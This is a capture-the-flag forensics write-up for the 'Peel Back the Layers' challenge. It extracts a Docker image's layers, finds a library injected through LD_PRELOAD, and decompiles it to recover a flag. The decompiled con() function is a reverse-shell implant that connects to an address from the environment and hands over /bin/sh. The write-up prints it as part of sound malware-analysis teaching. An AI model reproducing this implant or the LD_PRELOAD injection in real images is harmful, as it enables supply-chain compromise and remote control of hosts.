# (forensics) Peel Back the Layers

### Proof of Concept


> An unknown maintainer managed to push an update to one of our public docker images. Our SOC team reported suspicious traffic coming from some of our steam factories ever since. The update got retracted making us unable to investigate further. We are concerned that this might refer to a supply-chain attack. Could you investigate? Docker Image: steammaintainer/gearrepairimage

The quick and dirty for this challenge is that you have to download the docker image, see what files are added to the image and then reverse engineer a tainted binary.

### Vulnerability Explanation

First step is to grab the Docker Image, which we can do with the `docker pull` command. This will download the image from the Docker Hub to our system.

```bash
[~/peel-back-the-layers]$ sudo docker pull steammaintainer/gearrepairimage
Password:
Using default tag: latest
latest: Pulling from steammaintainer/gearrepairimage
Digest: sha256:10d7e659f8d2bc2abcc4ef52d6d7caf026d0881efcffe016e120a65b26a87e7b
Status: Image is up to date for steammaintainer/gearrepairimage:latest
docker.io/steammaintainer/gearrepairimage:latest
```

From there we should get the image into a form that we can do some more analysis. 

```bash
[~/peel-back-the-layers]$ docker image ls                                             
REPOSITORY                        TAG       IMAGE ID       CREATED        SIZE
steammaintainer/gearrepairimage   latest    47f41629f1cf   2 weeks ago    72.8MB
``` 

Listing the images we get the image ID and from there we can save the image to a `tar` file using the command `sudo docker save 47f41629f1cf > peel-back-layers.tar`. 

```bash 
[~/peel-back-the-layers]$ tar -xvf peel-back-layers.tar -C extracted              
x 06ec107a7c3909292f0730a926f0bf38071c4b930618cb2480e53584f4b60777/
x 06ec107a7c3909292f0730a926f0bf38071c4b930618cb2480e53584f4b60777/VERSION
x 06ec107a7c3909292f0730a926f0bf38071c4b930618cb2480e53584f4b60777/json
x 06ec107a7c3909292f0730a926f0bf38071c4b930618cb2480e53584f4b60777/layer.tar
x 47f41629f1cfcaf8890339a7ffdf6414c0c1417cfa75481831c8710196627d5d.json
x 7e418781d7dbe3c9982a8f00849d9494404dce6698e8ab6e82068f3f810212ca/
x 7e418781d7dbe3c9982a8f00849d9494404dce6698e8ab6e82068f3f810212ca/VERSION
x 7e418781d7dbe3c9982a8f00849d9494404dce6698e8ab6e82068f3f810212ca/json
x 7e418781d7dbe3c9982a8f00849d9494404dce6698e8ab6e82068f3f810212ca/layer.tar
x 9a8e24973203d27297e31bb8932c0d9bdf962092790556f82b2affa1ad0ea102/
x 9a8e24973203d27297e31bb8932c0d9bdf962092790556f82b2affa1ad0ea102/VERSION
x 9a8e24973203d27297e31bb8932c0d9bdf962092790556f82b2affa1ad0ea102/json
x 9a8e24973203d27297e31bb8932c0d9bdf962092790556f82b2affa1ad0ea102/layer.tar
x manifest.json
```

Let's explore some more. First step is to checkout the `manifest.json` file which contains info about the image. 

```bash
[~/peel-back-the-layers/extracted]$ cat manifest.json | jq    
[
  {
    "Config": "47f41629f1cfcaf8890339a7ffdf6414c0c1417cfa75481831c8710196627d5d.json",
    "RepoTags": null,
    "Layers": [
      "06ec107a7c3909292f0730a926f0bf38071c4b930618cb2480e53584f4b60777/layer.tar",
      "7e418781d7dbe3c9982a8f00849d9494404dce6698e8ab6e82068f3f810212ca/layer.tar",
      "9a8e24973203d27297e31bb8932c0d9bdf962092790556f82b2affa1ad0ea102/layer.tar"
    ]
  }
]
```

It can be seen that the config file for this image is stored in `47f41629f1cfcaf8890339a7ffdf6414c0c1417cfa75481831c8710196627d5d.json` so let's check that out. Keeping in mind that we are looking for suspicious files in relation to a supply chain attack.


```bash
[~/peel-back-the-layers/extracted]$ cat 47f41629f1cfcaf8890339a7ffdf6414c0c1417cfa75481831c8710196627d5d.json | jq
{
  "architecture": "amd64",
  "config": {
    "Hostname": "",
    "Domainname": "",
    "User": "",
    "AttachStdin": false,
    "AttachStdout": false,
    "AttachStderr": false,
    "Tty": false,
    "OpenStdin": false,
    "StdinOnce": false,
    "Env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "LD_PRELOAD="
    ],
    "Cmd": [
      "bin/bash",
      "-c",
      "/bin/bash"
    ],
    "Image": "sha256:698ee13ba91d629e91e1252ff00153703f142e98dff0a0ba32b7508eab980c34",
    "Volumes": null,
    "WorkingDir": "",
    "Entrypoint": null,
    "OnBuild": null,
    "Labels": null
  },
  "container": "3da18822ca20b2d4e396a27639de9b5f528454fef719129196e1e4926759d8ee",
  "container_config": {
    "Hostname": "3da18822ca20",
    "Domainname": "",
    "User": "",
    "AttachStdin": false,
    "AttachStdout": false,
    "AttachStderr": false,
    "Tty": false,
    "OpenStdin": false,
    "StdinOnce": false,
    "Env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "LD_PRELOAD="
    ],
    "Cmd": [
      "/bin/sh",
      "-c",
      "#(nop) ",
      "CMD [\"bin/bash\" \"-c\" \"/bin/bash\"]"
    ],
    "Image": "sha256:698ee13ba91d629e91e1252ff00153703f142e98dff0a0ba32b7508eab980c34",
    "Volumes": null,
    "WorkingDir": "",
    "Entrypoint": null,
    "OnBuild": null,
    "Labels": {}
  },
  "created": "2021-11-12T21:41:23.312026204Z",
  "docker_version": "20.10.10",
  "history": [
    {
      "created": "2021-10-16T00:37:47.226745473Z",
      "created_by": "/bin/sh -c #(nop) ADD file:5d68d27cc15a80653c93d3a0b262a28112d47a46326ff5fc2dfbf7fa3b9a0ce8 in / "
    },
    {
      "created": "2021-10-16T00:37:47.578710012Z",
      "created_by": "/bin/sh -c #(nop)  CMD [\"bash\"]",
      "empty_layer": true
    },
    {
      "created": "2021-11-12T21:40:04.484599651Z",
      "created_by": "/bin/sh -c #(nop)  CMD [\"bin/bash\" \"-c\" \"/bin/bash\"]",
      "empty_layer": true
    },
    {
      "created": "2021-11-12T21:40:23.425193373Z",
      "created_by": "/bin/sh -c #(nop) COPY file:0b1afae23b8f468ed1b0570b72d4855f0a24f2a63388c5c077938dbfdeda945c in /usr/share/lib/librs.so "
    },
    {
      "created": "2021-11-12T21:40:23.607982534Z",
      "created_by": "/bin/sh -c #(nop)  ENV LD_PRELOAD=/usr/share/lib/librs.so",
      "empty_layer": true
    },
    {
      "created": "2021-11-12T21:40:23.786804383Z",
      "created_by": "/bin/sh -c #(nop)  CMD [\"bin/bash\" \"-c\" \"/bin/bash\"]",
      "empty_layer": true
    },
    {
      "created": "2021-11-12T21:40:52.872983785Z",
      "created_by": "/bin/sh -c #(nop)  ENV LD_PRELOAD=",
      "empty_layer": true
    },
    {
      "created": "2021-11-12T21:40:53.032080675Z",
      "created_by": "/bin/sh -c #(nop)  CMD [\"bin/bash\" \"-c\" \"/bin/bash\"]",
      "empty_layer": true
    },
    {
      "created": "2021-11-12T21:41:23.130319525Z",
      "created_by": "/bin/sh -c rm -rf /usr/share/lib/"
    },
    {
      "created": "2021-11-12T21:41:23.312026204Z",
      "created_by": "/bin/sh -c #(nop)  CMD [\"bin/bash\" \"-c\" \"/bin/bash\"]",
      "empty_layer": true
    }
  ],
  "os": "linux",
  "rootfs": {
    "type": "layers",
    "diff_ids": [
      "sha256:9f54eef412758095c8079ac465d494a2872e02e90bf1fb5f12a1641c0d1bb78b",
      "sha256:0a9080e8e7b0e66532e403a406ccdbc7c58fea8493928a3baaf5ca83e2943e26",
      "sha256:ff26ebc5902675b2764f7d6c70f4cf073d2c9ee50ad929648d2769871cafe441"
    ]
  }
}
```

Looking through the config file, there is some funky stuff going on with and `LD_PRELOAD`. We should probably look into the file that's being loaded there.

```bash
{
	"created": "2021-11-12T21:40:23.607982534Z",
	**"created_by": "/bin/sh -c #(nop)  ENV LD_PRELOAD=/usr/share/lib/librs.so"**,
	"empty_layer": true
}
```
    
 Untarring one of the layers, we can get the `librs.so` file so we can do some RE. 
 
```bash 
[~/peel-back-the-layers/extracted/7e418781d7dbe3c9982a8f00849d9494404dce6698e8ab6e82068f3f810212ca]$ tar -xvf layer.tar                                                                                              
x usr/
x usr/share/
x usr/share/lib/
x usr/share/lib/.wh..wh..opq
x usr/share/lib/librs.so
```

### Reverse Engineering of `librs.so`

Running through some prelim binary analysis steps...

```bash
[~/programming/ctfs/htb-uni-2021/peel-back-the-layers]$ file librs.so                                              
librs.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=b6e2da9852ab0b8f7aa409d6c5cf0f3c133b5ed7, not stripped
```
Opening up `librs.so` in Binary Ninja, we are greeted with a pretty interesting `con()` function.

```c
00001195  int64_t con()
000011a5      if (fork() == 0)
000011b6          char* rax_1 = getenv(name: "REMOTE_ADDR")
000011ce          uint16_t rax_3 = atoi(nptr: getenv(name: "REMOTE_PORT"))
000011eb          int64_t var_68 = 0x33725f317b425448     /* HMMMM */
000011ef          int64_t var_60_1 = 0x6b316c5f796c6c34   /* HMMMM */
00001207          int64_t var_58_1 = 0x706d343374735f33   /* HMMMM */
0000120b          int64_t var_50_1 = 0x306230725f6b6e75   /* HMMMM */
00001219          int64_t var_48_1 = 0xd0a7d2121217374    /* HMMMM */
0000121d          char var_40_1 = 0
00001221          int16_t var_38 = 2
00001233          in_addr_t var_34_1 = inet_addr(cp: rax_1)
00001241          uint16_t var_36_1 = htons(x: rax_3)
00001254          int32_t rax_8 = socket(domain: AF_INET, type: SOCK_STREAM, protocol: 0)
0000126d          connect(fd: rax_8, addr: &var_38, len: 0x10)
00001283          write(fd: rax_8, buf: &var_68, nbytes: 0x29)
00001292          dup2(oldfd: rax_8, newfd: 0)
000012a1          dup2(oldfd: rax_8, newfd: 1)
000012b0          dup2(oldfd: rax_8, newfd: 2)
000012c6          execve(filename: "/bin/sh", argv: nullptr, envp: nullptr)
000012d8      return 0
```

This is pretty clearly an implant that grants a shell, but the more important part is the integer variables that are defined. Lets copy those and see if they decode to anything meaningful. I wrote a really bad lil python program to decode the bytes. 

```python
# Array of bytes from librs.so
flag = [0x33725f317b425448, 0x6b316c5f796c6c34, 0x706d343374735f33, 0x306230725f6b6e75, 0xd0a7d2121217374]

# Convert to bytes in the correct endienness
decoded = [(i).to_bytes(8, byteorder='little').decode() for i in flag]

# Win!
print("".join(decoded))
```

Running this we get our flag and we're done! 

```bash
[~/peel-back-the-layers]$ python3 solve.py                                            
HTB{1_r34lly_l1k3_st34mpunk_r0b0ts!!!}
``` 


